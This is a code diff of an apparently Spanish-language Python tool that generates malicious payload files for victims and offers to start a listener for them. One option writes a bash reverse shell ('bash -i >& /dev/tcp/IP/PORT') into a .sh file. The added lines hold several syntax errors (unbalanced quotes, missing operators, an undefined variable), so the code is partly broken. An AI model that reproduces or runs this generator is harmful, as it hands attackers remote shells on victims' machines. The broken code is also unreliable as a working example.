@@ -25,7 +25,7 @@ if numero == 1:
    
    >  """)
 
-   malware = input("""
+   name_malware = input("""
    Nombre del archivo malicioso
    >  """)
    
@@ -50,15 +50,19 @@ if numero == 1:
              "    pass"
 
 
-   with open(""+ path_malware +""+ malware +".py", "w")as f:
+   with open(""+ path_malware +""+ name_malware +".py", "w")as f:
       f.write(viruspy)
+   clearScr()
+   print("El malware se encuentra en la carpeta {malware}")
+   path_malwaree = os.getcwd()+ "/malware_victima/""+ name_malware "
+   print("Ruta absoluta malware > "path_malwaree)  
+
+    option_listen = input("""
+    Ahora necesita abrir un listener en el puerto escogido para poder conecatarse cuando la victima ejecute el archivo.
    
-   option_listen = input("""
-   Ahora necesita abrir un listener en el puerto escogido para poder conecatarse cuando la victima ejecute el archivo.
+    Quiere desplegar un listener?  [y/n] 
    
-   Quiere desplegar un listener?  [y/n] 
-   
-   >  """)
+    >  """)
 
 def option_listener_yes(): 
      clearScr()
@@ -91,7 +95,7 @@ if numero == 2:
    Introduzca un puerto {ejemplo: 4444}
    
    >  """)
-   malware = input("""
+   name_malware = input("""
    Nombre del archivo malicioso
    >  """)
 
@@ -103,9 +107,11 @@ if numero == 2:
              "bash -i >& /dev/tcp/"+ ip +"/"+ puerto +" 0>&1\n"\
              "clear"
              
-   with open(""+ path_malware +""+ malware +".sh", "w")as f:
+   with open(""+ path_malware +""+ name_malware +".sh", "w")as f:
       f.write(virussh)
-
+   print("El malware se encuentra en la carpeta {malware}")
+   path_malwaree = os.getcwd()+ "/malware_victima/""+ name_malware +"
+   print("Ruta absoluta malware > "path_malwaree)  
    
    option_listen = input("""
    Ahora necesita abrir un listener en el puerto escogido para poder conectarse cuando la victima ejecute el archivo.
@@ -147,15 +153,16 @@ if numero == 3:
     >  """)
 
     os.system('cp plantilla.py '+ name_malware +'.py')
-    with open(""+ name_malware +"", "rt")as f:
+    with open(""+ name_malware +".py", "rt")as f:
       x = f.read()
 
     with open(""+ name_malware +".py", "wt"")as f:
       x = x.replace("ip", ""+ ip +"")
       x = x.replace("puerto", ""+ puerto +"")
       fin.write(x)
-              
-      
+    print("El malware se encuentra en la carpeta {malware}")
+    path_malwaree = os.getcwd()+ "/malware_victima/""+ name_malware +"
+    print("Ruta absoluta malware > " path_malwaree)  
   
     option_listen = input("""
     Ahora necesita abrir un listener en el puerto escogido para poder conecatarse cuando la victima ejecute el archivo.
